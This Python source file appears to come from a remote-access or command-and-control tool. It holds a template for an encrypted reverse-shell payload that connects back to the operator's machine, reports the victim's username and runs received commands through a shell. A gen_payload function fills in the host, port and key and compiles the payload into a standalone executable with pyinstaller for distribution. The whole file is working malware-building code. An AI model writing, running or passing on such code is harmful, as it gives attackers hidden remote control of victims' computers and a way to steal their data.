import sys
import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]

string = """
from Crypto.Cipher import AES
import subprocess, socket
import base64
import os

BLOCK_SIZE = 32
PADDING = '0'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
secret = "{enc_key}"
iv = os.urandom(16)
cipher = AES.new(secret, AES.MODE_CFB, iv)
HOST = "{host}"
PORT = {port}

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("Trying to Connect ... !!!")
s.connect((HOST, PORT))
print("Connection EstaBlished")
user_priv = os.popen("whoami").read().strip()
s.send(user_priv.encode())


while 1:
    data = s.recv(1024)
    decrypted = DecodeAES(cipher, data).decode("ISO-8859-1")
    print (decrypted)
    
    if decrypted == "quit":
        break
    
    if decrypted[:5] == "shell":
        proc = subprocess.Popen(decrypted[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()
        encrypted = EncodeAES(cipher, stdoutput)
        s.send(encrypted)
    else:
        stdoutput = "Invalid Command"
        encrypted = EncodeAES(cipher, stdoutput)
        s.send(encrypted)

    
s.close()
"""


def gen_payload(id, port, key):
    var = {'enc_key': key, 'host': ip, 'port':port}
    file_name = 'static/payloads/listener-%d.py' %id
    f = open(file_name,'w')
    f.write(string.format(**var))
    f.close()
    os.system("pyinstaller --onefile --distpath static/payloads/ static/payloads/listener-%d.py" % id)

